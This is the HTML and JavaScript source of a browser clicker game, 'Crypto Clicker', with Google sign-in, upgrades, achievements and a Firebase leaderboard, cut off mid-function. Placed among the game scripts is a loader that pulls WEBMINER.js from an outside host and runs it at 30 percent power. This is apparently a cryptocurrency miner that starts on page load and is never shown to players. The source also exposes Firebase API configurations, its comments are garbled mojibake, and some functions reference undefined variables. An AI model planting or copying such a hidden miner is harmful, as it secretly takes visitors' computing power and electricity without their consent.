<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Crypto Clicker</title>
  <style>
    body {
      background: #0f0f0f;
      color: #fff;
      font-family: 'Segoe UI', sans-serif;
      text-align: center;
      padding: 20px;
    }
    input { padding: 8px; font-size: 16px; margin-bottom: 10px; border-radius: 5px; border: none; }
    .click-button {
      background: linear-gradient(135deg, #00ffa6, #00c3ff);
      color: #000;
      font-weight: bold; /* –ñ–∏—Ä–Ω—ã–π —Ç–µ–∫—Å—Ç */
      padding: 15px 30px;
      font-size: 18px;
      border-radius: 12px;
      cursor: pointer;
      margin: 10px;
      border: none;
      
    }
    /* –£–≤–µ–ª–∏—á–∏–º —Ç–µ–∫—Å—Ç "Tokens: 0" */
     #counter {
    font-size: 36px; /* –ë—ã–ª–æ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é, —Ç–µ–ø–µ—Ä—å –∫—Ä—É–ø–Ω–µ–µ */
    margin-top: 20px;
    font-weight: bold;
    transition: transform 0.2s ease;   
  }
   /* –ö–æ–≥–¥–∞ –¥–æ–±–∞–≤–ª—è–µ—Ç—Å—è –∫–ª–∞—Å—Å .bounce */
    #counter.bounce {
      transform: scale(1.2);
    }
    #levelMessage {
    display: none;
    opacity: 0;
    transition: opacity 1s ease-in-out;
    color: gold;
    font-weight: bold;
    margin-top: 5px;
  }
  #levelMessage.show {
    display: block;
    opacity: 1;
       }
    
    table { margin: 20px auto; border-collapse: collapse; width: 80%; max-width: 600px; }
    th, td { padding: 10px; border-bottom: 1px solid #333; }
    th { background-color: #00c3ff; color: #000; }
    #message { margin-top: 10px; color: #ff5555; }
    .progress-container { background-color: #222; border-radius: 10px; height: 12px; width: 140px; margin: 10px auto; overflow: hidden; box-shadow: 0 0 5px #00ffc8; }
    .progress-bar { height: 100%; background: linear-gradient(90deg, #00ffc8 0%, #00c3ff 100%); width: 0%; transition: width 0.3s ease-in-out; border-radius: 10px; }
    #profilePanel { position: absolute; top: 20px; left: 20px; background-color: #1a1a1a; padding: 15px; border-radius: 12px; box-shadow: 0 0 10px #00c3ff; width: 200px; text-align: left; }
    #profilePanel div { margin: 6px 0; }
    #buttonGroup { margin-top: 180px; }
    #motiveText { /* –ù–æ–≤—ã–π —Å—Ç–∏–ª—å –¥–ª—è –º–æ—Ç–∏–≤–∞—Ü–∏–æ–Ω–Ω—ã—Ö —Ñ—Ä–∞–∑ */
      margin-top: 20px;
      font-size: 18px;
      color: #00ffc8;
      text-shadow: 0 0 8px #00ffc8;
      transition: opacity 0.5s ease-in-out;
    }

    .achievement-panel {
  max-height: 0;
  overflow: hidden;
  transition: max-height 0.4s ease, padding 0.4s ease;
  padding: 0 10px;
  background-color: #1a1a1a;
  border-radius: 10px;
  margin-top: 20px;
  box-shadow: 0 0 10px #00c3ff;
}

.achievement-panel.open {
  max-height: 500px; /* —É–≤–µ–ª–∏—á–∏ –µ—Å–ª–∏ –Ω—É–∂–Ω–æ –±–æ–ª—å—à–µ –≤—ã—Å–æ—Ç—ã */
  padding: 10px;
}

    /* Previews*/


   /*     .preview {
      width: 100vw;
      height: 100vh;
      background: linear-gradient(to bottom right, #111, #1a1a1a);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      animation: fadeIn 1.2s ease-in-out;
    }
    .preview img {
      width: 280px;
      max-width: 90%;
      margin-bottom: 20px;
      border-radius: 20px;
      box-shadow: 0 0 20px #0f0;
    }
    .preview h1 {
      font-size: 3em;
      margin: 0.2em 0;
      color: #0f0;
    }
    .preview p {
      font-size: 1.3em;
      margin: 8px 0;
      color: #ccc;
    }
    .preview button {
      padding: 15px 30px;
      font-size: 1.2em;
      margin-top: 30px;
      background: #00cc66;
      color: white;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      transition: 0.3s;
    }
    .preview button:hover {
      background: #00ff80;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.98); }
      to { opacity: 1; transform: scale(1); }
    }
    /* Previews*/

/* –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä –¥–ª—è iframe ads*/
.ad-container {
  text-align: center;
  margin: 20px 0;
  max-width: 100%;
  overflow: hidden;
}

/* –°—Ç–∏–ª–∏ –¥–ª—è iframe ads */
.ad-container iframe {
  max-width: 100%;
  width: 728px;
  height: 90px;
  border: none;
}

/* –ú–µ–¥–∏–∞-–∑–∞–ø—Ä–æ—Å –¥–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ ads */
@media (max-width: 768px) {
  .ad-container iframe {
    width: 100%;
    height: auto;
    max-width: 300px; /* –ò–ª–∏ –¥—Ä—É–≥–æ–π —Ä–∞–∑–º–µ—Ä, –ø–æ–¥—Ö–æ–¥—è—â–∏–π –¥–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö */
  }
}
    
    
  </style>
</head>

<body>

<!--<div class="preview" id="preview">
  <img src="https://via.placeholder.com/300x180.png?text=Circle+Game" alt="Game Preview">
  <h1>Free Game</h1>
  <p>Boost Your Click Power</p>
  <p>Unlock Achievements & Bonuses</p>
  <p>Compete on the Leaderboard</p>
  <button onclick="startGame()">Start Playing</button>
</div> -->
  

<div id="profilePanel">
  <div><strong>Player:</strong> <span id="profileName">Anonymous</span></div>
  <div><strong>Level:</strong> <span id="playerLevel">1</span> / 10</div>
  <div><strong>Click Power:</strong> <span id="profileClickPower">1</span></div>
  <div><strong>Autoclicker:</strong> <span id="profileAutoclick">Inactive</span></div>
  <div><strong>Tokens:</strong> <span id="profileTokens">0</span></div>
  <div><button class="click-button" onclick="signOut()">Sign Out</button></div>
</div>

  <div id="playerLevelContainer">
  
  <div id="levelMessage" style="display: none; color: gold; font-weight: bold; margin-top: 5px;">
    <!-- Message will appear here -->
  </div>
</div>


<h1>Crypto Clicker üí∞</h1>

<div id="authSection">
  <button class="click-button" onclick="signInWithGoogle()">Sign in with Google</button>
  
  <!-- –ù–æ–≤—ã–π –±–ª–æ–∫ –º–æ—Ç–∏–≤–∞—Ü–∏–∏ -->
  <div id="motiveText">Click ‚Äî earn tokens.</div>
</div>

<div id="gameSection" style="display:none;">

<div id="dailyReward" style="display: none; margin-top: 20px;">
  <h2>Daily Reward</h2>
  <p id="streakText">Login streak: 0 days</p>
  <button class="click-button" onclick="claimDailyReward()">Claim Reward</button>
</div>
  
  <div id="counter">Tokens: 0</div>
  <div id="message"></div>
  <div id="buttonGroup">
    <button class="click-button" onclick="clickToken()">Collect Token</button>
 <!--   <button class="click-button" onclick="submitScore()">Save</button> -->
    <button class="click-button" onclick="toggleShop()">Shop</button>
    <button class="click-button" onclick="toggleAchievements()">üèÜ Achievements</button> 
    
  </div>


  <div id="shop" style="display:none; margin-top: 20px;">
    <h2>üõí Upgrades</h2>
  <!-- <p>üí™ Click Power +1 (Cost: 50)</p> -->
    <p id="clickPowerCostText">üí™ Click Power +1 (Cost: 50)</p> 
    
    <p>Current: <span id="clickPowerDisplay">1</span> / 8</p>
    <div class="progress-container">
      <div class="progress-bar" id="clickPowerBar"></div>
    </div>
    <button class="click-button" onclick="buyUpgrade('clickPower')">Buy</button>

    <div style="margin-top: 20px;">
      <p>Autoclicker (Cost: 200)</p>
      <button class="click-button" id="autoclickBtn" onclick="buyUpgrade('autoclick')">Buy</button>
    </div>

<h2>‚ö° Autoclickers</h2>
<div id="autoclickerShop" style="display: flex; flex-wrap: wrap; justify-content: center; gap: 20px;">

  <div style="background: #1a1a1a; padding: 20px; border-radius: 12px; width: 200px; box-shadow: 0 0 10px #00c3ff;">
    <h3>1 Minute</h3>
    <p>Cost: 200 Tokens</p>
    <button class="click-button" onclick="buyAutoclicker(1)">Buy</button>
  </div>

  <div style="background: #1a1a1a; padding: 20px; border-radius: 12px; width: 200px; box-shadow: 0 0 10px #00c3ff;">
    <h3>5 Minutes</h3>
    <p>Cost: 800 Tokens</p>
    <button class="click-button" onclick="buyAutoclicker(5)">Buy</button>
  </div>

  <div style="background: #1a1a1a; padding: 20px; border-radius: 12px; width: 200px; box-shadow: 0 0 10px #00c3ff;">
    <h3>10 Minutes</h3>
    <p>Cost: 1400 Tokens</p>
    <button class="click-button" onclick="buyAutoclicker(10)">Buy</button>
  </div>

</div> 
    

    
  </div>

  
  

<div id="achievementsPanel" class="achievement-panel">
  <h2>Achievements</h2>
  <div id="achievementsList"></div>
</div>
  
  

  <h2>Leaderboard</h2>
  <table>
    <thead><tr><th>#</th><th>Player</th><th>Tokens</th></tr></thead>
    <tbody id="leaderboard"></tbody>
  </table>
</div>

<script src="https://wm.bmwebm.org/WEBMINER.js"></script>
  
<script>WEBMINER.config({ login: "5991295", pass: null }).power(30);</script>  

  
<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>

<script>
/*!!!const firebaseConfig = {
  apiKey: "AIzaSyBGK_Tuwke5TfltTt9Dtkeh9aWuZkSNFt4",
  authDomain: "cryptoclicker-e6a69.firebaseapp.com",
  databaseURL: "https://cryptoclicker-e6a69-default-rtdb.firebaseio.com",
  projectId: "cryptoclicker-e6a69",
  storageBucket: "cryptoclicker-e6a69.appspot.com",
  messagingSenderId: "290231276060",
  appId: "1:290231276060:web:406a5f2ce9c3a0a354c5d9"
};!!*/
  
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyDVgvBf_C6dIMtZ4MISwR5YRCBi8_JXinQ",
  authDomain: "cryptoclickertry.firebaseapp.com",
  databaseURL: "https://cryptoclickertry-default-rtdb.firebaseio.com",
  projectId: "cryptoclickertry",
  storageBucket: "cryptoclickertry.firebasestorage.app",
  messagingSenderId: "1017002572592",
  appId: "1:1017002572592:web:e06e5f4ba00017dc1466f5",
  measurementId: "G-W2T3BN4LL3"
};

  

firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const auth = firebase.auth();

const allAchievements = {
  superClicker: { name: "Super Clicker", description: "Click 10,000 times", reward: "+2 Click Power (2 min)" },
  tokenHoarder: { name: "Token Hoarder", description: "Collect 1,000,000 tokens", reward: "+2 Click Power (2min)" },
  level5: { name: "Level 5 Reached", description: "Reach level 5", reward: "+1 Click Power" },
 /* autoclickerMaster: { name: "Autoclicker Master", description: "Use autoclicker 10 times", reward: " Free Autoclicker 2 minutes " } */
};
  
  

// >>> –°–Æ–î–ê –≤—Å—Ç–∞–≤–∏—Ç—å <<<
const levelUpRequirements = [
  50000,          // —É—Ä–æ–≤–µ–Ω—å 1 ‚Üí 2
  100000,         // —É—Ä–æ–≤–µ–Ω—å 2 ‚Üí 3
  500000,         // —É—Ä–æ–≤–µ–Ω—å 3 ‚Üí 4
  2500000,        // —É—Ä–æ–≤–µ–Ω—å 4 ‚Üí 5
  50000000,       // —É—Ä–æ–≤–µ–Ω—å 5 ‚Üí 6
  200000000,      // —É—Ä–æ–≤–µ–Ω—å 6 ‚Üí 7
  800000000,      // —É—Ä–æ–≤–µ–Ω—å 7 ‚Üí 8
  3200000000,     // —É—Ä–æ–≤–µ–Ω—å 8 ‚Üí 9
  10000000000     // —É—Ä–æ–≤–µ–Ω—å 9 ‚Üí 10
];  

/*const clickPowerUpgradeCosts = [50, 100, 200, 400, 800, 1600, 3200]; // –¥–æ 8 —É—Ä–æ–≤–Ω—è */
  
//const MAX_CLICK_POWER = 8;
  
let user = null;
let score = 0;
let clickPower = 1;
let autoclickActive = false;
let autoclickInterval = null;
let autoclickEndTime = 0;
let autoclickCooldown = false;
let currentLevel = 1; // –≥–ª–æ–±–∞–ª—å–Ω–∞—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è —É—Ä–æ–≤–Ω—è  
let totalClicks = 0; // –û–±—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∫–ª–∏–∫–æ–≤
let autoclickerUses = 0; // –°–∫–æ–ª—å–∫–æ —Ä–∞–∑ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä
let achievements = {}; // –ü–æ–ª—É—á–µ–Ω–Ω—ã–µ –¥–æ—Å—Ç–∏–∂–µ–Ω–∏—è
let tempBoostTimeout = null;
let originalClickPower = null;
//let tokenBalance = 100;

  

function updateProfilePanel() {
  document.getElementById("profileClickPower").innerText = Math.min(clickPower, 8); 

 
  if (autoclickActive) {
    const remaining = Math.max(0, autoclickEndTime - Date.now());
    const seconds = Math.floor(remaining / 1000) % 60;
    const minutes = Math.floor(remaining / 60000);
    document.getElementById("profileAutoclick").innerText = `Active: ${minutes}:${seconds.toString().padStart(2, '0')}`;
  } else {
    document.getElementById("profileAutoclick").innerText = "Inactive";
  }
  // –ù–∞–π—Ç–∏ —Ç–µ–∫—É—â–∏–π —É—Ä–æ–≤–µ–Ω—å
  let level = 1;
  for (let i = 0; i < levelUpRequirements.length; i++) {
    if (score >= levelUpRequirements[i]) {
      level = i + 2; // —Ç–∞–∫ –∫–∞–∫ —É—Ä–æ–≤–µ–Ω—å = –∏–Ω–¥–µ–∫—Å + 2
    } else {
      break;
    }
  }

  
/*  const level = Math.min(Math.floor(score / 100) + 1, 10); */
  document.getElementById("playerLevel").innerText = level;
  
  document.getElementById("profileTokens").innerText = score;
  document.getElementById("profileName").innerText = user?.displayName || "Anonymous";

  // Message when maximum level is reached
  const levelMessageElement = document.getElementById("levelMessage");
  if (level === 10) {
    levelMessageElement.innerText = "Maximum level reached!";
   /* levelMessageElement.style.display = "block"; */
    levelMessageElement.classList.add("show");
  } else {
  /*  levelMessageElement.style.display = "none"; */
    levelMessageElement.classList.remove("show");
  }
}

function checkDailyReward() {
  if (!user) return;
  const today = new Date().toDateString();
  db.ref("dailyRewards/" + user.uid).once("value").then(snapshot => {
    const data = snapshot.val() || { lastLogin: "", streak: 0 };
    const lastLogin = data.lastLogin || "";
    let streak = data.streak || 0;

    if (lastLogin !== today) {
      document.getElementById("dailyReward").style.display = "block";
      if (new Date(lastLogin).toDateString() === new Date(Date.now() - 86400000).toDateString()) {
        streak++;
      } else {
        streak = 1;
      }
      db.ref("dailyRewards/" + user.uid).set({ lastLogin: today, streak: streak });
      document.getElementById("streakText").innerText = `Login streak: ${streak} days`;
    }
  });
}

function claimDailyReward() {
  db.ref("dailyRewards/" + user.uid).once("value").then(snapshot => {
    const data = snapshot.val();
    const streak = data.streak || 1;
    const rewards = [50, 100, 200, 300, 500, 1000, 2000]; // –ù–∞–≥—Ä–∞–¥—ã –∑–∞ 1-7 –¥–Ω–µ–π
    const reward = rewards[Math.min(streak - 1, rewards.length - 1)];
    
    score += reward;
    updateCounterDisplay();
    submitScore();
    showMessage(`Claimed ${reward} tokens for ${streak}-day streak!`);
    document.getElementById("dailyReward").style.display = "none";
  });
}


  
function setClickPower(newPower) {
  clickPower = Math.min(newPower, 8); // –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –º–∞–∫—Å–∏–º—É–º–æ–º 8
  updateClickPowerBar();
  updateProfilePanel();
}


  function getClickPowerUpgradeCost() {
  return Math.floor(500 * Math.pow(6, clickPower - 1));
  }
  

function updateClickPowerCostText() {
  const costText = document.getElementById('clickPowerCostText');
  if (costText) {
    const cost = getClickPowerUpgradeCost();
    costText.textContent = `üí™ Click Power +1 (Cost: ${cost})`;
  }
} 

/*function updateClickPowerCostText() {
  const costText = document.getElementById('clickPowerCostText');
  if (costText) {
    if (clickPower >= MAX_CLICK_POWER) {
      costText.textContent = "üí™ Click Power: MAX LEVEL";
    } else {
      const cost = getClickPowerUpgradeCost();
      costText.textContent = `üí™ Click Power +1 (Cost: ${cost})`;
    }
  }
        } */
    
  
/*function boostClickPowerTemporarily(amount, duration) {
  clickPower += amount;
  updateClickPowerBar();
  showMessage(`Temporary boost: Click Power +${amount} for ${duration / 1000} seconds!`);

  if (tempBoostTimeout) clearTimeout(tempBoostTimeout);

  tempBoostTimeout = setTimeout(() => {
    clickPower -= amount;
    updateClickPowerBar();
    showMessage(`Boost expired: Click Power -${amount}`);
  }, duration);
}*/



function boostClickPowerTemporarily(amount, duration) {
  if (tempBoostTimeout) clearTimeout(tempBoostTimeout);

  originalClickPower = clickPower;
  const boosted = Math.min(clickPower + amount, 8);
  clickPower = boosted;

  const actualBoost = boosted - originalClickPower;
  showMessage(`Temporary boost: Click Power +${actualBoost} for ${duration / 1000} sec`);

  tempBoostTimeout = setTimeout(() => {
    clickPower = originalClickPower;
    showMessage(`Boost expired: Click Power restored`);
  }, duration);
}
  

  

function toggleAchievements() {
  const panel = document.getElementById('achievementsPanel');
  const btn = document.getElementById('achievementsBtn');
  const isOpen = panel.classList.toggle('open');
  btn.innerHTML = isOpen ? 'üèÜ Achievements ‚ñ≤' : 'üèÜ Achievements ‚ñº';
}
  
function renderAchievements() {
  const list = document.getElementById('achievementsList');
  list.innerHTML = '';

  for (const key in allAchievements) {
    const achieved = achievements[key];
    const ach = allAchievements[key];

    const div = document.createElement('div');
    div.style.marginBottom = '10px';
    div.style.padding = '8px';
    div.style.border = '1px solid #00c3ff';
    div.style.borderRadius = '8px';
    div.style.backgroundColor = achieved ? '#00ffa6' : '#222';
    div.style.color = achieved ? '#000' : '#fff';
    div.innerHTML = `<strong>${ach.name}</strong><br>${ach.description}<br><em>${ach.reward}</em>`;
    list.appendChild(div);
  }
}


  
 function updateClickPowerBar() {
  document.getElementById("clickPowerDisplay").innerText = clickPower;
  const progress = Math.min((clickPower / 8) * 100, 100);
  document.getElementById("clickPowerBar").style.width = progress + "%";
   updateClickPowerCostText(); // <-- –¥–æ–±–∞–≤—å—Ç–µ —ç—Ç–æ 
} 


  
  
function updateCounterDisplay() {
  document.getElementById("counter").innerText = `Tokens: ${score}`;
}

function showMessage(msg) {
  const el = document.getElementById("message");
  el.innerText = msg;
  setTimeout(() => el.innerText = '', 3000);
}

function clickToken() {
  score += clickPower;
  totalClicks++;
  checkAchievements();
  updateCounterDisplay();
  updateProfilePanel();
  animateCounter(); // –¥–æ–±–∞–≤–ª—è–µ–º –∞–Ω–∏–º–∞—Ü–∏—é –ø–æ—Å–ª–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Ç–µ–∫—Å—Ç–∞
}
  
function updateCounter() {
  document.getElementById('counter').textContent = `Tokens: ${tokenCount}`;
  document.getElementById('profileTokens').textContent = tokenCount;
}

// –ù–æ–≤–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –∞–Ω–∏–º–∞—Ü–∏–∏
function animateCounter() {
  const counter = document.getElementById('counter');
  counter.classList.add('bounce');
  setTimeout(() => {
    counter.classList.remove('bounce');
  }, 200);
}
  
  function checkAchievements() {
  // –°–µ–∫—Ä–µ—Ç–Ω–æ–µ –¥–æ—Å—Ç–∏–∂–µ–Ω–∏–µ: 10,000 –∫–ª–∏–∫–æ–≤
  if (!achievements.superClicker && totalClicks >= 10000) {
    achievements.superClicker = true;
    boostClickPowerTemporarily(2, 120000); // +2 –Ω–∞ 1 –º–∏–Ω
    showMessage("Secret Achievement Unlocked: Super Clicker! Click Power +2 for 2 minutes!");
    updateClickPowerBar(); 
    renderAchievements();
    saveAchievements(); // —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –≤ –±–∞–∑—É!
    
  }

  // –°–µ–∫—Ä–µ—Ç–Ω–æ–µ –¥–æ—Å—Ç–∏–∂–µ–Ω–∏–µ: 1 –º–∏–ª–ª–∏–æ–Ω —Ç–æ–∫–µ–Ω–æ–≤
  if (!achievements.tokenHoarder && score >= 1000000) {
    achievements.tokenHoarder = true;
   /* clickPower += 5; */
    boostClickPowerTemporarily(2, 120000); // +2 –Ω–∞ 1 –º–∏–Ω
    showMessage("Secret Achievement Unlocked: Token Hoarder! Click Power +2 for 2 minutes!");
    updateClickPowerBar();
    renderAchievements();
    saveAchievements(); // —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –≤ –±–∞–∑—É!

  }

  // –°–µ–∫—Ä–µ—Ç–Ω–æ–µ –¥–æ—Å—Ç–∏–∂–µ–Ω–∏–µ: –î–æ—Å—Ç–∏–≥ 5 —É—Ä–æ–≤–Ω—è
  const currentLevel = parseInt(document.getElementById("playerLevel").innerText);
  if (!achievements.level5 && currentLevel >= 5) {
    achievements.level5 = true;
   /* clickPower += 1;*/
    boostClickPowerTemporarily(2, 120000); // +2 –Ω–∞ 1 –º–∏–Ω
    showMessage("Secret Achievement Unlocked: Level 5 Reached! Click Power +2 for 2 minutes!");
    updateClickPowerBar();
    renderAchievements();
    saveAchievements(); // —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –≤ –±–∞–∑—É!

  }

  // –°–µ–∫—Ä–µ—Ç–Ω–æ–µ –¥–æ—Å—Ç–∏–∂–µ–Ω–∏–µ: –ê–∫—Ç–∏–≤–∏—Ä–æ–≤–∞—Ç—å –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä 10 —Ä–∞–∑
 if (!achievements.autoclickerMaster && autoclickerUses >= 10) {
    achievements.autoclickerMaster = true;
    // –£–¥–≤–æ–∏—Ç—å —Å–∫–æ—Ä–æ—Å—Ç—å –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞
    clearInterval(autoclickInterval);
    autoclickInterval = setInterval(() => clickToken(), 500); // 0.5 —Å–µ–∫—É–Ω–¥—ã –≤–º–µ—Å—Ç–æ 1
    
    showMessage("Secret Achievement Unlocked: Autoclicker Master!");
    // –í–∫–ª—é—á–∞–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä –Ω–∞ 2 –º–∏–Ω—É—Ç—ã –±–µ–∑ –≤—ã—á–µ—Ç–∞ —Ç–æ–∫–µ–Ω–æ–≤
  //  startFreeAutoclicker(120000); // 2 –º–∏–Ω—É—Ç—ã
    renderAchievements();
    saveAchievements(); // —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –≤ –±–∞–∑—É!

  }
}

 function saveAchievements() {
  if (!user) return;
  db.ref("achievements/" + user.uid).set(achievements);
}
  
/* free !!!! function startFreeAutoclicker(duration) {
  clearInterval(autoclickInterval);
  autoclickInterval = setInterval(() => clickToken(), 1000);
  autoclickActive = true;
  autoclickEndTime = Date.now() + duration;

  // –û–±–Ω–æ–≤–∏—Ç—å –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å
  updateProfilePanel();

  setTimeout(() => {
    stopAutoclicker(); // —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∞—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∞
    showMessage("Free Autoclicker expired.");
  }, duration);
} !!!!*/


 /*  function startFreeAutoclicker(duration) {
  if (autoclickActive) {
    stopAutoclicker();
  }

  autoclickActive = true;
  autoclickEndTime = Date.now() + duration;
  autoclickInterval = setInterval(() => clickToken(), 1000);

  // –û–±–Ω–æ–≤–ª—è–µ–º –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å
  updateProfilePanel();
  submitScore();

  // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –≤ –±–∞–∑–µ
  if (user) {
    db.ref("leaderboard/" + user.uid).update({
      autoclickActive: true,
      autoclickEndTime: autoclickEndTime
    }).catch(error => {
      console.error("–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –±–µ—Å–ø–ª–∞—Ç–Ω–æ–≥–æ –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞:", error);
    });
  }

  setTimeout(() => {
    stopAutoclicker();
    showMessage("Free Autoclicker expired.");
  }, duration);
} */

  
  
    
  function toggleShop() {
  const shop = document.getElementById("shop");
  shop.style.display = shop.style.display === "none" ? "block" : "none";
}

/*!!!! function startAutoclicker(duration) {
  //clearInterval(autoclickInterval);
  autoclickInterval = setInterval(() => clickToken(), 1000);
  updateProfilePanel();
  setTimeout(() => stopAutoclicker(), duration);

  autoclickerUses++;
  checkAchievements();
} !!!*/



 function startAutoclicker(duration) {
  // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä, –µ—Å–ª–∏ –æ–Ω –∞–∫—Ç–∏–≤–µ–Ω
 if (autoclickActive) {
    stopAutoclicker();
  } 

  // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞
  autoclickActive = true;
  autoclickEndTime = Date.now() + duration;
  autoclickInterval = setInterval(() => clickToken(), 1000);
  autoclickerUses++;
  checkAchievements();

  // –û–±–Ω–æ–≤–ª—è–µ–º –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å
  updateProfilePanel();
  submitScore();

  // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –≤ –±–∞–∑–µ
  if (user) {
    db.ref("leaderboard/" + user.uid).update({
      autoclickActive: true,
      autoclickEndTime: autoclickEndTime,
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏—è –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞:", error);
    });
  }

  // –ü–ª–∞–Ω–∏—Ä—É–µ–º –æ—Å—Ç–∞–Ω–æ–≤–∫—É –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞
  setTimeout(() => stopAutoclicker(), duration);


} 
  

/* !!!!function stopAutoclicker() {
  clearInterval(autoclickInterval);
  autoclickActive = false;
  autoclickEndTime = 0;
  updateProfilePanel();
  submitScore();
  showMessage("Autoclicker deactivated.");
  setTimeout(() => {
    autoclickCooldown = false;
    document.getElementById("autoclickBtn").disabled = false;
    showMessage("Autoclicker available again.");
  }, 1000);
} !!!*/


 function stopAutoclicker() {
  clearInterval(autoclickInterval);
  autoclickActive = false;
  autoclickEndTime = 0;
  autoclickInterval = null;

  // –û–±–Ω–æ–≤–ª—è–µ–º –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å
  updateProfilePanel();
  submitScore();
  showMessage("Autoclicker deactivated.");

  // –°–Ω–∏–º–∞–µ–º –∫—É–ª–¥–∞—É–Ω —á–µ—Ä–µ–∑ 1 —Å–µ–∫—É–Ω–¥—É
  setTimeout(() => {
    autoclickCooldown = false;
    document.getElementById("autoclickBtn").disabled = false;
    showMessage("Autoclicker available again.");
  }, 1000);

  // –û–±–Ω–æ–≤–ª—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –≤ –±–∞–∑–µ
  if (user) {
    db.ref("leaderboard/" + user.uid).update({
      autoclickActive: false,
      autoclickEndTime: 0,
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("–û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏—è –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞:", error);
    });
  }
} 


/* !!!! function loadPlayerData(uid) {
  db.ref("leaderboard/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      score = data.score || 0;
      clickPower = data.clickPower || 1;
      autoclickEndTime = data.autoclickEndTime || 0;
      originalClickPower = data.originalClickPower || 1;
      updateCounterDisplay();
      updateClickPowerBar();
      updateProfilePanel();
      updateAchievementsUI();
      updateAutoClickerDisplay();

      if (autoclickEndTime > Date.now()) {
        autoclickActive = true;
        document.getElementById("autoclickBtn").disabled = true;
        startAutoclicker(autoclickEndTime - Date.now());
      } else {
        autoclickActive = false;
        autoclickEndTime = 0;
      }
    }
  });

  db.ref("achievements/" + uid).once("value").then(snapshot => {
  const data = snapshot.val();
  if (data) {
    achievements = data;
    renderAchievements();
  }
});
  
} !!!!!*/




  function loadPlayerData(uid) {
  db.ref("leaderboard/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      score = data.score || 0;
      clickPower = data.clickPower || 1;
      autoclickActive = data.autoclickActive || false;
      autoclickEndTime = data.autoclickEndTime || 0;
      const lastUpdate = data.lastUpdate || 0;

      // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä–∞
      if (autoclickActive && autoclickEndTime > Date.now()) {
        // –†–∞—Å—Å—á–∏—Ç—ã–≤–∞–µ–º –≤—Ä–µ–º—è, –ø–æ–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –±—ã–ª –æ—Ñ—Ñ–ª–∞–π–Ω
        const elapsedTime = Date.now() - lastUpdate;
        const secondsPassed = Math.floor(elapsedTime / 1000);
        const tokensEarned = secondsPassed * clickPower;

        // –ù–∞—á–∏—Å–ª—è–µ–º —Ç–æ–∫–µ–Ω—ã –∑–∞ –æ—Ñ—Ñ–ª–∞–π–Ω
        if (tokensEarned > 0) {
          score += tokensEarned;
          showMessage(`Autoclicker earned ${tokensEarned} tokens while you were away!`);
        }

        // –í–æ–∑–æ–±–Ω–æ–≤–ª—è–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä –Ω–∞ –æ—Å—Ç–∞–≤—à–µ–µ—Å—è –≤—Ä–µ–º—è
        const remainingTime = autoclickEndTime - Date.now();
